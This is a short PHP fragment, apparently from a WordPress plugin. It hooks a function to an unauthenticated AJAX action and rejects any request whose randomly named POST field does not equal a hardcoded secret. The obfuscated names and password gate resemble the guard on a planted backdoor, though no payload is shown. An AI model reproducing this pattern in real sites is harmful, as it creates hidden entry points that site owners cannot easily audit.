<?php

function word_cron_accordion_site() {
	if (!isset($_POST["wmpuztqtcislf"]) || $_POST["wmpuztqtcislf"] !== "rM6XT2jjbBfUF") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'word_cron_accordion_site', 5, 1);
